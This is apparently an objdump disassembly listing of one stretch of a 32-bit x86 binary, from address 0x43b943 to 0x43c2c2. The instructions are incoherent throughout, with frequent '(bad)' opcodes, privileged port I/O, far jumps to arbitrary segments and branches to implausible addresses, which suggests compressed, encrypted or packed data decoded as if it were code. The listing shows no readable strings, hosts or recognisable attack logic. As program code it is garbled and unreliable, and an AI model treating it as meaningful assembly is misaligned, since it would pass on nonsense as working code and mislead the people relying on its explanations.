  43b943:	(bad)  
  43b945:	into   
  43b946:	pop    edx
  43b947:	popf   
  43b948:	jae    0x43b97d
  43b94a:	mov    esp,ebx
  43b94c:	cmc    
  43b94d:	jmp    0x43b90a
  43b94f:	add    al,0x66
  43b951:	in     eax,dx
	...
  43b96e:	add    BYTE PTR [eax],al
  43b970:	aad    0x66
  43b972:	std    
  43b973:	stc    
  43b974:	and    eax,0x31f9745a
  43b979:	aam    0x7
  43b97b:	sahf   
  43b97c:	mov    ebx,0x451cfa55
  43b981:	or     BYTE PTR gs:[ebp-0x567ca5db],cl
  43b988:	mov    ds:0xfef4faf1,al
  43b98d:	test   edx,eax
  43b98f:	bound  eax,QWORD PTR [ebp+eiz*2-0x4b]
  43b993:	ins    DWORD PTR es:[edi],dx
  43b994:	in     eax,0x59
  43b996:	sub    DWORD PTR [ecx],0x62
  43b999:	add    DWORD PTR [edi+0x305ac9e8],ebp
  43b99f:	xor    dh,ch
  43b9a1:	shr    ebx,cl
  43b9a3:	inc    ecx
  43b9a4:	push   esp
  43b9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b9a6:	cli    
  43b9a7:	add    bl,cl
  43b9a9:	out    0x73,eax
  43b9ab:	lock fdiv st(6),st
  43b9ae:	mov    ds:0xb9dafbff,al
  43b9b3:	pop    edi
  43b9b4:	mov    cl,BYTE PTR [edi+eax*8-0x3e]
  43b9b8:	cmp    BYTE PTR [ecx],al
  43b9ba:	push   ebp
  43b9bb:	mov    ebx,DWORD PTR [eax]
  43b9bd:	xor    cl,BYTE PTR [edi+0x68]
  43b9c0:	ins    BYTE PTR es:[edi],dx
  43b9c1:	xlat   BYTE PTR ds:[ebx]
  43b9c2:	cmp    al,BYTE PTR [eax]
  43b9c4:	or     ecx,DWORD PTR [esi]
  43b9c6:	jo     0x43b9da
  43b9c8:	add    DWORD PTR fs:[ecx-0x4521f3bb],ecx
  43b9cf:	jne    0x43b9c7
  43b9d1:	sbb    DWORD PTR [edx+0x53],edi
	...
  43b9ef:	add    BYTE PTR [eax],al
  43b9f1:	add    BYTE PTR [ebx+0x248e4e38],ah
  43b9f7:	add    al,0x50
  43b9f9:	xor    ecx,ebx
  43b9fb:	in     al,0x13
  43b9fd:	test   al,0xe6
  43b9ff:	inc    eax
  43ba00:	cli    
  43ba01:	mov    bl,BYTE PTR [esi+edi*2+0x3c2074d1]
  43ba08:	dec    BYTE PTR [edi]
  43ba0a:	mov    ah,0x0
  43ba0c:	bound  ecx,QWORD PTR [eax]
  43ba0e:	jnp    0x43ba1e
  43ba10:	fcom   st(6)
  43ba12:	out    0x3,eax
  43ba14:	not    DWORD PTR ds:0x3ff3c0
  43ba1a:	pop    ds
  43ba1b:	in     al,dx
  43ba1c:	cmp    edi,0x0
  43ba1f:	stc    
  43ba20:	dec    ebp
  43ba21:	(bad)  
  43ba22:	icebp  
  43ba23:	out    0x4a,eax
  43ba25:	push   edi
  43ba26:	dec    edx
  43ba27:	in     eax,0x5
  43ba29:	add    BYTE PTR [esi+esi*1-0x6],dh
  43ba2d:	mov    BYTE PTR [ecx-0xe2c0a1c],al
  43ba33:	ret    
  43ba34:	jae    0x43ba44
  43ba36:	(bad)  
  43ba37:	idiv   BYTE PTR ds:[ebx]
  43ba3a:	xor    dl,BYTE PTR [ebp+0x39]
  43ba3d:	(bad)  
  43ba3e:	or     eax,0xd03002d
  43ba43:	ret    0x52f9
  43ba46:	rcl    DWORD PTR gs:[ebp+0x617c4afa],1
  43ba4d:	je     0x43ba94
  43ba4f:	adc    eax,0xa71fb811
  43ba54:	inc    BYTE PTR [esi+0x0]
	...
  43ba72:	add    BYTE PTR [eax],al
  43ba74:	dec    edx
  43ba75:	inc    ebp
  43ba76:	(bad)
  43ba79:	xchg   ebx,eax
  43ba7a:	jne    0x43ba67
  43ba7c:	mov    esp,0xdfbe0e9
  43ba81:	xchg   ebp,eax
  43ba82:	jne    0x43bab8
  43ba84:	xchg   ebp,eax
  43ba85:	cmp    edi,DWORD PTR [esi-0x3f139c01]
  43ba8b:	sti    
  43ba8c:	pop    ebp
  43ba8d:	jg     0x43ba8d
  43ba8f:	gs das 
  43ba91:	push   0xffffffef
  43ba93:	pop    es
  43ba94:	repnz fwait
  43ba96:	jg     0x43ba57
  43ba98:	pusha  
  43ba99:	adc    DWORD PTR ds:0xbebde145,ebp
  43ba9f:	cli    
  43baa0:	add    BYTE PTR ds:0xe60d400d,bh
  43baa6:	data16 jne 0x43bae9
  43baa9:	add    DWORD PTR [edi+0x44],esi
  43baac:	shr    DWORD PTR [ecx],0xf0
  43baaf:	sub    eax,0xfa983da5
  43bab4:	mov    dl,0xce
  43bab6:	data16 test BYTE PTR [edx+0x488d1af5],ch
  43babd:	jne    0x43ba8d
  43babf:	push   edx
  43bac0:	daa    
  43bac1:	inc    edi
  43bac2:	popa   
  43bac3:	je     0x43baca
  43bac5:	or     BYTE PTR [esi+edi*2-0x7b],0x68
  43baca:	out    dx,eax
  43bacb:	setbe  BYTE PTR [eax+edi*8]
  43bacf:	test   BYTE PTR [ebp+0x55],cl
  43bad2:	inc    DWORD PTR [esi+0x7c64ffc0]
	...
  43baf4:	add    BYTE PTR [eax],al
  43baf6:	adc    al,BYTE PTR [edi-0x4cf5a5df]
  43bafc:	inc    eax
  43bafd:	adc    DWORD PTR [ebx+0x4d32495b],esi
  43bb03:	mov    ebx,0x8883ca2
  43bb08:	jmp    0x97b046dd
  43bb0d:	xor    BYTE PTR [ecx-0x743217a5],0x15
  43bb14:	popf   
  43bb15:	adc    ch,cl
  43bb17:	push   DWORD PTR [ecx-0x47a43688]
  43bb1d:	fstp   DWORD PTR [edx]
  43bb1f:	pop    edx
  43bb20:	xchg   ebx,eax
  43bb21:	not    DWORD PTR [edi]
  43bb23:	aad    0xf0
  43bb25:	data16 fadd QWORD PTR [eax+ebp*1-0x53e6b810]
  43bb2d:	addr16 jle 0x43bb46
  43bb30:	jmp    0x6a04:0x28ef010f
  43bb37:	pop    eax
  43bb38:	pop    esi
  43bb39:	out    dx,eax
  43bb3a:	aaa    
  43bb3b:	xchg   DWORD PTR [ebx],ebp
  43bb3d:	push   0xefe6405b
  43bb42:	das    
  43bb43:	push   0x5ac79b60
  43bb48:	ins    DWORD PTR es:[edi],dx
  43bb49:	ins    BYTE PTR es:[edi],dx
  43bb4a:	mov    DWORD PTR [edx+0x3c],ebx
  43bb4d:	or     BYTE PTR [eax+0x5fd4acc4],cl
  43bb53:	pop    ebx
  43bb54:	sbb    edi,eax
  43bb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bb57:	aam    0xf0
  43bb59:	add    BYTE PTR fs:[eax],al
	...
  43bb78:	mov    esp,0x2003907e
  43bb7d:	add    al,0x5e
  43bb7f:	cmp    eax,0x5c1a07ab
  43bb84:	mov    ch,0xa8
  43bb86:	jns    0x43bbed
  43bb88:	xor    eax,DWORD PTR [eax-0x1]
  43bb8b:	adc    eax,0xe1bd4753
  43bb90:	push   cs
  43bb91:	mov    ch,0x86
  43bb93:	push   ebp
  43bb94:	ds scas eax,DWORD PTR es:[edi]
  43bb96:	jle    0x43bb5c
  43bb98:	jmp    0x7455:0x49bf4d5a
  43bb9f:	fucomp st(1)
  43bba1:	repz ret 
  43bba3:	fisttp DWORD PTR [esi+0x5a]
  43bba6:	stc    
  43bba7:	mov    ah,0x12
  43bba9:	xor    DWORD PTR [ecx+ebp*1],0xa
  43bbad:	sar    bh,0x61
  43bbb0:	ror    DWORD PTR [ebx+0x55412544],0x74
  43bbb7:	in     eax,dx
  43bbb8:	imul   edx,DWORD PTR [ebp-0x6],0xfaaf0ee9
  43bbbf:	xchg   esp,eax
  43bbc0:	push   ss
  43bbc1:	push   ebp
  43bbc2:	shr    DWORD PTR [ecx+edx*2-0x2c],1
  43bbc6:	pop    ebx
  43bbc7:	(bad)  
  43bbc8:	adc    ecx,DWORD PTR [edi+ecx*1]
  43bbcb:	test   eax,0x73f7d90e
  43bbd0:	jecxz  0x43bb82
  43bbd2:	xchg   BYTE PTR [esi*2-0x5e1127ee],ch
  43bbd9:	call   0x0:0x5d3f
	...
  43bbf8:	add    BYTE PTR [eax],al
  43bbfa:	fwait
  43bbfb:	popa   
  43bbfc:	sbb    al,0x80
  43bbfe:	imul   edx,DWORD PTR [esi-0x78],0xbf84392c
  43bc05:	xor    eax,0xb64f18f7
  43bc0a:	stos   DWORD PTR es:[edi],eax
  43bc0b:	add    eax,0x8403ae50
  43bc10:	or     eax,0x74551129
  43bc15:	cmc    
  43bc16:	sbb    eax,esp
  43bc18:	sti    
  43bc19:	cmp    DWORD PTR [eax],esi
  43bc1b:	aam    0xf7
  43bc1d:	ss sub ah,dl
  43bc20:	pop    es
  43bc21:	add    BYTE PTR [ebx+0x75f879cb],dl
  43bc27:	push   0xf
  43bc29:	mov    ebp,DWORD PTR [ecx]
  43bc2b:	hlt    
  43bc2c:	test   al,al
  43bc2e:	js     0x43bc8a
  43bc30:	or     DWORD PTR [ebp-0x10],0xa98b02d5
  43bc37:	in     eax,0xe1
  43bc39:	or     al,bl
  43bc3b:	imul   esi,edx,0xf57633e8
  43bc41:	inc    DWORD PTR [edi-0x43]
  43bc44:	push   ebp
  43bc45:	pop    esi
  43bc46:	outs   dx,DWORD PTR ds:[esi]
  43bc47:	push   ss
  43bc48:	mov    ebp,0x814a2410
  43bc4d:	in     al,dx
  43bc4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bc4f:	mov    al,0x6
  43bc51:	push   ebx
  43bc52:	push   0xffffffd8
  43bc54:	xor    edi,DWORD PTR [eax+0x19]
  43bc57:	cmp    eax,0x598e56fa
  43bc5c:	push   ecx
  43bc5d:	lea    eax,[eax]
	...
  43bc7b:	add    BYTE PTR [ecx-0x1f],ch
  43bc7e:	dec    edx
  43bc7f:	lea    edi,[ecx-0x2695b518]
  43bc85:	jecxz  0x43bcfa
  43bc87:	or     BYTE PTR [ebp+0x42],ch
  43bc8a:	idiv   bh
  43bc8c:	sbb    bl,al
  43bc8e:	cmp    ebp,DWORD PTR [eax-0x1505c317]
  43bc94:	push   cs
  43bc95:	mov    DWORD PTR [ebx-0xc],eax
  43bc98:	imul   eax,esp,0x2f31216e
  43bc9e:	not    BYTE PTR [ecx+0x41]
  43bca1:	das    
  43bca2:	out    dx,al
  43bca3:	push   ecx
  43bca4:	pop    esi
  43bca5:	push   edi
  43bca6:	dec    edx
  43bca7:	mov    ecx,ebp
  43bca9:	or     ecx,DWORD PTR [ecx-0x2f239fa3]
  43bcaf:	dec    DWORD PTR [ecx]
  43bcb1:	or     al,0x89
  43bcb3:	inc    ebp
  43bcb4:	ins    BYTE PTR es:[edi],dx
  43bcb5:	fmul   st(5),st
  43bcb7:	or     DWORD PTR ds:0x19ff5bf4,0xffffff8f
  43bcbe:	mov    esi,0x418fe659
  43bcc3:	add    ecx,DWORD PTR ds:0xdceb8af4
  43bcc9:	not    DWORD PTR [esi+0x44]
  43bccc:	add    DWORD PTR [edi-0x2],esp
  43bccf:	(bad)  
  43bcd0:	in     eax,dx
  43bcd1:	cmp    al,BYTE PTR [edx]
  43bcd3:	das    
  43bcd4:	dec    ebp
  43bcd5:	lods   eax,DWORD PTR ds:[esi]
  43bcd6:	out    dx,eax
  43bcd7:	jle    0x43bcc9
  43bcd9:	scas   al,BYTE PTR es:[edi]
  43bcda:	add    ecx,DWORD PTR [edi-0x45]
  43bcdd:	fstp   QWORD PTR [eax]
  43bcdf:	rol    BYTE PTR [eax],0x0
	...
  43bcfe:	and    BYTE PTR [edi-0x13f29a02],ah
  43bd04:	enter  0xddf7,0xe3
  43bd08:	enter  0xddfa,0x29
  43bd0c:	(bad)  [ebx]
  43bd0e:	sub    bh,BYTE PTR [ebx+0x6]
  43bd11:	sti    
  43bd12:	cmp    esp,ebx
  43bd14:	inc    ebx
  43bd15:	je     0x43bcea
  43bd17:	icebp  
  43bd18:	clc    
  43bd19:	or     edi,esi
  43bd1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bd1c:	(bad)  
  43bd1d:	jle    0x43bd24
  43bd1f:	test   bh,dl
  43bd21:	ss xchg esi,eax
  43bd23:	pushf  
  43bd24:	push   esi
  43bd25:	aas    
  43bd26:	adc    DWORD PTR [esi+eiz*2+0x5d66a529],0x39e4c586
  43bd31:	jae    0x43bd6a
  43bd33:	mov    bl,0x3
  43bd35:	lea    edx,[eax+0x31]
  43bd38:	scas   al,BYTE PTR es:[edi]
  43bd39:	dec    esi
  43bd3a:	shr    BYTE PTR [edi+ecx*1+0x5d5140fb],cl
  43bd41:	ror    DWORD PTR [esi+0x1d750341],1
  43bd47:	loop   0x43bd10
  43bd49:	js     0x96488ff8
  43bd4f:	add    BYTE PTR [esp+ebx*2],dh
  43bd52:	xchg   ebp,eax
  43bd53:	or     BYTE PTR [esi+0x46],ch
  43bd56:	mov    bl,0x8
  43bd58:	ss ins BYTE PTR es:[edi],dx
  43bd5a:	frstor [edi+0x403b6289]
  43bd60:	and    bh,BYTE PTR [edi+0x0]
	...
  43bd7e:	add    BYTE PTR [eax],al
  43bd80:	push   ebp
  43bd81:	inc    edx
  43bd82:	in     al,dx
  43bd83:	add    ebx,edi
  43bd85:	mov    dh,BYTE PTR [edi+0x4a]
  43bd88:	or     al,0xe4
  43bd8a:	pop    edx
  43bd8b:	ret    
  43bd8c:	push   0x5f
  43bd8e:	cli    
  43bd8f:	mov    cl,0x67
  43bd91:	push   edi
  43bd92:	push   edx
  43bd93:	(bad)  
  43bd94:	cs or  al,ch
  43bd97:	xlat   BYTE PTR ds:[ebx]
  43bd98:	or     al,0xae
  43bd9a:	inc    eax
  43bd9b:	adc    DWORD PTR [ebp+0x57],esi
  43bd9e:	inc    ecx
  43bd9f:	mov    cs,WORD PTR [esi+esi*4+0x26]
  43bda3:	pop    es
  43bda4:	or     eax,0x8d6f5dad
  43bda9:	fadd   QWORD PTR fs:[ecx*1-0x40464a00]
  43bdb1:	mov    ah,BYTE PTR [eax]
  43bdb3:	xchg   BYTE PTR [edi],dl
  43bdb5:	and    al,0xe2
  43bdb7:	test   DWORD PTR [ecx+0x0],edi
  43bdba:	jmp    0x589a49c2
  43bdbf:	or     BYTE PTR ds:0x8592ea00,cl
  43bdc5:	(bad)  
  43bdc6:	call   0xe0f847ce
  43bdcb:	mov    bl,al
  43bdcd:	retf   
  43bdce:	repz adc BYTE PTR [esi-0x27a399fe],bl
  43bdd5:	shr    bl,cl
  43bdd7:	test   dl,bl
  43bdd9:	out    dx,al
  43bdda:	push   ebx
  43bddb:	xlat   BYTE PTR ds:[ebx]
  43bddc:	xchg   ebx,eax
  43bddd:	int3   
  43bdde:	hlt    
  43bddf:	dec    eax
  43bde0:	mov    DWORD PTR [edi-0x46],edx
  43bde3:	popa   
	...
  43be00:	add    BYTE PTR [eax],al
  43be02:	mov    bh,0xfb
  43be04:	(bad)  
  43be05:	call   0xaec8be18
  43be0a:	lds    ecx,FWORD PTR [ecx]
  43be0c:	xchg   DWORD PTR [esi+0x648c4890],edi
  43be12:	cmp    DWORD PTR [ecx-0x6],ebx
  43be15:	xchg   esi,eax
  43be16:	and    DWORD PTR [esi-0x291370c9],edi
  43be1c:	cmp    ecx,ebp
  43be1e:	pop    edx
  43be1f:	(bad)  
  43be20:	or     dh,BYTE PTR [edi]
  43be22:	inc    edi
  43be23:	push   esp
  43be24:	mov    esp,DWORD PTR [esi]
  43be26:	xor    eax,0x53fbc80e
  43be2b:	faddp  st(7),st
  43be2d:	jmp    0xd72bbe40
  43be32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43be33:	pop    ecx
  43be34:	cli    
  43be35:	bound  edi,QWORD PTR [ecx+0x41d5f17b]
  43be3b:	pop    esi
  43be3c:	ss xchg esp,eax
  43be3e:	lods   al,BYTE PTR ds:[esi]
  43be3f:	pop    ecx
  43be40:	cs sub esp,eax
  43be43:	add    BYTE PTR [edi+eiz*2+0x49],ch
  43be47:	push   esi
  43be48:	fs pusha 
  43be4a:	push   edi
  43be4b:	mov    esi,0x51f9ebe6
  43be50:	test   BYTE PTR [edi],dl
  43be52:	xor    eax,0x3a1652fa
  43be57:	or     ah,BYTE PTR [edx+0x60]
  43be5a:	out    dx,eax
  43be5b:	icebp  
  43be5c:	out    0x20,eax
  43be5e:	mov    ah,0x5a
  43be60:	cli    
  43be61:	jo     0x43be2a
  43be63:	add    eax,0x2985
	...
  43be84:	(bad)  
  43be86:	xchg   bh,ah
  43be88:	clc    
  43be89:	add    BYTE PTR [edi+0x2f056db7],al
  43be8f:	test   eax,0xa056b7cd
  43be94:	dec    eax
  43be95:	std    
  43be96:	jmp    DWORD PTR [ecx+0x2b]
  43be99:	les    edx,FWORD PTR [ecx]
  43be9b:	add    ah,dh
  43be9d:	sti    
  43be9e:	test   bl,bl
  43bea0:	add    BYTE PTR [edx],ch
  43bea2:	push   0x1a480
  43bea7:	lea    ebx,[edx]
  43bea9:	inc    esp
  43beaa:	fs add bh,ah
  43bead:	ficom  WORD PTR [ebx]
  43beaf:	push   eax
  43beb0:	mov    ds:0xe18afa41,al
  43beb5:	add    edi,DWORD PTR [ebx-0x3c]
  43beb8:	push   0x8b50ace9
  43bebd:	loopne 0x43bf09
  43bebf:	inc    DWORD PTR [ecx-0x6c00b4f7]
  43bec5:	jl     0x43be85
  43bec7:	or     al,0xe
  43bec9:	adc    bh,dh
  43becb:	jne    0x43bf25
  43becd:	xchg   BYTE PTR [eax+0x16],al
  43bed0:	xchg   esp,eax
  43bed1:	loopne 0x43bea0
  43bed3:	and    DWORD PTR [eax],0x5
  43bed6:	add    esi,0xffffffcf
  43bed9:	ja     0x43bf24
  43bedb:	push   ebp
  43bedc:	mov    ds:0xfbf08198,al
  43bee1:	or     cl,BYTE PTR ss:[ebx-0x59001703]
	...
  43bf04:	add    BYTE PTR [eax],al
  43bf06:	sti    
  43bf07:	fild   WORD PTR [ecx+0x2b842447]
  43bf0d:	dec    esp
  43bf0e:	and    al,BYTE PTR [ecx-0x6]
  43bf11:	mov    BYTE PTR [edx+0x51],ah
  43bf14:	pusha  
  43bf15:	mov    esi,DWORD PTR [ebx-0x4d769fb4]
  43bf1b:	dec    esp
  43bf1c:	jns    0x43bf85
  43bf1e:	aam    0x0
  43bf20:	sub    eax,eax
  43bf22:	mov    WORD PTR [eax+0x66f4fffa],es
  43bf28:	xchg   DWORD PTR [edi-0x20],eax
  43bf2b:	outs   dx,DWORD PTR ds:[esi]
  43bf2c:	push   ebp
  43bf2d:	dec    eax
  43bf2e:	imul   edi,DWORD PTR [esi],0x170d5342
  43bf34:	pop    ebx
  43bf35:	aam    0xfe
  43bf37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bf38:	in     eax,0x2b
  43bf3a:	sub    edx,eax
  43bf3c:	(bad)  
  43bf3d:	cli    
  43bf3e:	inc    ebx
  43bf3f:	aaa    
  43bf40:	jge    0x43bf03
  43bf42:	sbb    esi,ebp
  43bf44:	pop    edx
  43bf45:	aam    0x37
  43bf47:	push   ebx
  43bf48:	call   0xf1e94f4c
  43bf4d:	push   edx
  43bf4e:	call   0x7d67:0x4d11ae4b
  43bf55:	ret    
  43bf56:	xor    DWORD PTR [esi],esp
  43bf58:	mov    edx,0xb8a9e65c
  43bf5d:	xchg   BYTE PTR [ecx-0x19],ch
  43bf60:	outs   dx,DWORD PTR ds:[esi]
  43bf61:	push   edi
  43bf62:	or     al,0x67
  43bf64:	dec    BYTE PTR [esi+0x1e]
  43bf67:	jb     0x43bf1a
  43bf69:	aaa    
	...
  43bf86:	add    BYTE PTR [eax],al
  43bf88:	rcl    BYTE PTR [edx-0x2e],0x5
  43bf8c:	pop    edx
  43bf8d:	sub    ebp,esi
  43bf8f:	out    0x83,eax
  43bf91:	fcomp  QWORD PTR [edx-0x6]
  43bf94:	ss pop edi
  43bf96:	scas   al,BYTE PTR es:[edi]
  43bf97:	cli    
  43bf98:	mov    eax,0xb09b6636
  43bf9d:	adc    al,0x5b
  43bf9f:	xchg   BYTE PTR ds:0xc9734d51,bh
  43bfa5:	loope  0x43bf6f
  43bfa7:	or     edi,DWORD PTR [edx+0x1ba7a0cb]
  43bfad:	cmc    
  43bfae:	pop    edx
  43bfaf:	out    0x81,eax
  43bfb1:	cmp    bl,BYTE PTR [ecx-0x6]
  43bfb4:	ja     0x43c012
  43bfb6:	(bad)  
  43bfb7:	jl     0x43bfb6
  43bfb9:	mov    eax,ds:0x52298066
  43bfbe:	pop    ecx
  43bfbf:	push   ecx
  43bfc0:	and    ah,0xab
  43bfc3:	stc    
  43bfc4:	jmp    0x3900:0xca86ae62
  43bfcb:	xchg   ecx,eax
  43bfcc:	push   ecx
  43bfcd:	in     al,dx
  43bfce:	cmp    BYTE PTR [ecx+edi*2+0x6a],ch
  43bfd2:	rcr    DWORD PTR [esi+0x4b],1
  43bfd5:	cmp    al,0xf8
  43bfd7:	mov    esi,0xd7c15843
  43bfdc:	pop    ss
  43bfdd:	push   ebx
  43bfde:	xor    edi,eax
  43bfe0:	mov    edi,DWORD PTR [ebp-0x2f584d20]
  43bfe6:	loopne 0x43c046
  43bfe8:	stc    
  43bfe9:	iret   
  43bfea:	sti    
  43bfeb:	ret    
	...
  43c008:	add    BYTE PTR [eax],al
  43c00a:	call   0x5efe:0x1804a07e
  43c011:	cmp    eax,DWORD PTR [edi+0x316bf4cd]
  43c017:	call   0xa5c1:0x67dc5e81
  43c01e:	ja     0x43c073
  43c020:	adc    cl,BYTE PTR [edx+0x419fb7ab]
  43c026:	adc    al,BYTE PTR [eax]
  43c028:	mov    esp,0x4c7f668a
  43c02d:	iret   
  43c02e:	pop    esp
  43c02f:	mov    ebp,0x86dbf3e0
  43c034:	jmp    0x43c07d
  43c036:	adc    al,al
  43c038:	call   0x66267ef3
  43c03d:	fld    QWORD PTR [esi]
  43c03f:	push   cs
  43c040:	mov    ebx,0xe7fa1cec
  43c045:	xlat   BYTE PTR ds:[ebx]
  43c046:	scas   al,BYTE PTR es:[edi]
  43c047:	in     eax,0xe6
  43c049:	nop
  43c04a:	cdq    
  43c04b:	aas    
  43c04c:	shr    BYTE PTR [ebx+0x1],0x24
  43c050:	adc    bl,BYTE PTR [esi+0x7]
  43c053:	retf   0x8adc
  43c056:	iret   
  43c057:	push   edx
  43c058:	jp     0x43c065
  43c05a:	pop    ebp
  43c05b:	push   ebx
  43c05c:	adc    eax,0x868b3
  43c061:	xchg   ecx,eax
  43c062:	xchg   edi,eax
  43c063:	inc    ebp
  43c064:	out    0x2a,eax
  43c066:	repz pop eax
  43c068:	cli    
  43c069:	ins    DWORD PTR es:[edi],dx
  43c06a:	push   ecx
  43c06b:	iret   
  43c06c:	cmp    dl,BYTE PTR [ebx+0x0]
	...
  43c08b:	add    BYTE PTR [eax*4+0x5a89dd7c],cl
  43c092:	out    0x2,eax
  43c094:	pusha  
  43c095:	push   esi
  43c096:	mov    WORD PTR [ecx+ecx*1],gs
  43c099:	mov    al,0xfa
  43c09b:	aaa    
  43c09c:	in     eax,0x67
  43c09e:	ins    DWORD PTR es:[edi],dx
  43c09f:	dec    ecx
  43c0a0:	dec    ebx
  43c0a1:	push   esi
  43c0a2:	test   BYTE PTR [ecx+0x247eb1c5],ch
  43c0a8:	or     DWORD PTR [eax],eax
  43c0aa:	jb     0x43c0e8
  43c0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c0ad:	dec    DWORD PTR [edi+0x62]
  43c0b0:	push   edx
  43c0b1:	cli    
  43c0b2:	gs jmp 0x55d8:0x87f95ab8
  43c0ba:	xchg   BYTE PTR [edi],ah
  43c0bc:	jne    0x43c139
  43c0be:	mov    edi,0xffdc56fd
  43c0c3:	ins    DWORD PTR es:[edi],dx
  43c0c4:	cmp    eax,DWORD PTR [edx]
  43c0c6:	in     ax,dx
  43c0c8:	in     eax,0x17
  43c0ca:	sbb    bh,0x56
  43c0cd:	push   edx
  43c0ce:	jae    0x43c0e0
  43c0d0:	jecxz  0x43c0d2
  43c0d2:	add    ebp,edx
  43c0d4:	sbb    al,BYTE PTR [ebp+0x401c7d7c]
  43c0da:	out    0x5e,eax
  43c0dc:	in     al,0x56
  43c0de:	cli    
  43c0df:	ss inc ebx
  43c0e1:	push   es
  43c0e2:	xchg   DWORD PTR [esi],esp
  43c0e4:	rcl    al,0x7
  43c0e7:	mov    ecx,0x934f41b9
  43c0ec:	push   es
  43c0ed:	mov    eax,0x2686
	...
  43c10e:	jns    0x43c0bc
  43c110:	push   0xf
  43c112:	pusha  
  43c113:	jge    0x43c0d4
  43c115:	add    BYTE PTR [eax+0x4d],bh
  43c118:	add    DWORD PTR [esi-0x20],0x6afefa67
  43c11f:	add    eax,0xe57a0162
  43c124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c125:	(bad)  
  43c126:	repz mov ah,0x55
  43c129:	pop    ebx
  43c12a:	popf   
  43c12b:	mov    edi,0x8b0afffe
  43c130:	cmp    ecx,0xc76a2c2f
  43c136:	stos   DWORD PTR es:[edi],eax
  43c137:	sub    eax,0x7aa44088
  43c13c:	lock je 0x43c0f8
  43c13f:	in     eax,0xcd
  43c141:	mov    dh,0x72
  43c143:	mov    ah,0x81
  43c145:	idiv   DWORD PTR [edx+ebp*8-0x5e]
  43c149:	push   DWORD PTR [ebx-0x55]
  43c14c:	ds and al,0x70
  43c14f:	(bad)  
  43c150:	jae    0x43c158
  43c152:	cmp    esp,esp
  43c154:	sub    esp,DWORD PTR [ebp-0x387e4b6d]
  43c15a:	adc    edx,DWORD PTR [edx-0x758bfb44]
  43c160:	sub    esp,0x57508f05
  43c166:	repz sub DWORD PTR [esi],edx
  43c169:	xor    ecx,edi
  43c16b:	mov    bl,0x73
  43c16d:	sbb    BYTE PTR [edi+0x75f5b4],ch
	...
  43c18f:	add    BYTE PTR [eax],bh
  43c191:	mov    ah,0x73
  43c193:	adc    bl,dl
  43c195:	sub    DWORD PTR [esi],eax
  43c197:	(bad)  
  43c198:	jns    0x43c19f
  43c19a:	dec    ebx
  43c19b:	push   ebx
  43c19c:	int3   
  43c19d:	ret    0xfffa
  43c1a0:	xor    al,0x88
  43c1a2:	jmp    0x2d66:0x7528f73b
  43c1a9:	xchg   esp,eax
  43c1aa:	sbb    dh,BYTE PTR [ebp+ecx*1+0x37]
  43c1ae:	call   0xc2dc51c2
  43c1b3:	dec    esi
  43c1b4:	pop    ebp
  43c1b5:	cli    
  43c1b6:	icebp  
  43c1b7:	dec    edi
  43c1b8:	sbb    esp,DWORD PTR [edi+0x5ad17efe]
  43c1be:	call   0x85bcfcc0
  43c1c3:	inc    ecx
  43c1c4:	push   ecx
  43c1c5:	dec    edx
  43c1c6:	nop
  43c1c7:	inc    edx
  43c1c8:	sub    al,0xb9
  43c1ca:	mov    cl,BYTE PTR [edx-0x13]
  43c1cd:	rol    BYTE PTR [eax+eiz*8+0x15],0xb9
  43c1d2:	or     al,cl
  43c1d4:	xor    edx,eax
  43c1d6:	mov    ebp,0xf8198641
  43c1db:	mov    BYTE PTR [ebx+0x1f],dl
  43c1de:	fidivr WORD PTR [eax]
  43c1e0:	inc    edx
  43c1e1:	dec    ebx
  43c1e2:	retf   0x273e
  43c1e5:	sti    
  43c1e6:	mov    BYTE PTR [ecx+0x39],al
  43c1e9:	push   ss
  43c1ea:	mov    ah,0xfa
  43c1ec:	and    BYTE PTR [edi],dl
  43c1ee:	out    dx,al
  43c1ef:	aas    
  43c1f0:	or     eax,0xb3fe6
	...
  43c211:	add    bh,ah
  43c213:	xor    DWORD PTR [esi-0x4fe77b9f],esi
  43c219:	or     ah,BYTE PTR [ebx-0x699deedf]
  43c21f:	icebp  
  43c220:	punpckldq mm1,DWORD PTR [edi+eax*8+0xb]
  43c225:	bound  eax,QWORD PTR [esi]
  43c227:	sub    dl,ch
  43c229:	btr    edi,ebx
  43c22c:	mov    ebp,0x20198e51
  43c231:	(bad)  
  43c232:	rcr    DWORD PTR [edx+0x70844fad],cl
  43c238:	mov    dh,0xfa
  43c23a:	add    BYTE PTR [ebx-0x19f2c010],bl
  43c240:	aas    
  43c241:	or     eax,DWORD PTR [edi+edi*8-0x7b48183e]
  43c248:	and    bh,BYTE PTR [edx+0x45b3a963]
  43c24e:	sbb    al,BYTE PTR [eax]
  43c250:	mov    ah,0x8e
  43c252:	out    0xb1,al
  43c254:	xchg   edi,eax
  43c255:	or     bh,BYTE PTR [esi+0x6b35b601]
  43c25b:	dec    eax
  43c25c:	out    0xd0,al
  43c25e:	or     bh,BYTE PTR [ecx-0x65]
  43c261:	pop    ebx
  43c262:	test   DWORD PTR [ebp-0x7cf4911c],esi
  43c268:	loopne 0x43c25c
  43c26a:	inc    ecx
  43c26b:	push   es
  43c26c:	pusha  
  43c26d:	mov    al,0xba
  43c26f:	jns    0x43c28c
  43c271:	pop    eax
  43c272:	dec    eax
  43c273:	dec    edi
  43c274:	cmp    esi,eax
	...
  43c292:	add    BYTE PTR [eax],al
  43c294:	mov    bh,0xd5
  43c296:	fdiv   DWORD PTR [ebp+0x5ae4d5a7]
  43c29c:	sbb    eax,edi
  43c29e:	test   eax,0x1b4f96d0
  43c2a3:	pop    esp
  43c2a4:	stos   BYTE PTR es:[edi],al
  43c2a5:	add    al,0xe9
  43c2a7:	add    ecx,DWORD PTR ds:0x82f3a639
  43c2ad:	mov    ah,0x5d
  43c2af:	lea    ebx,[si-0xc]
  43c2b3:	add    al,0xd
  43c2b5:	add    BYTE PTR [esi],dl
  43c2b7:	lahf   
  43c2b8:	out    dx,al
  43c2b9:	add    al,0xe9
  43c2bb:	add    edi,DWORD PTR [edi-0x547504a]
  43c2c1:	(bad)  
  43c2c2:	loop   0x43c2b1
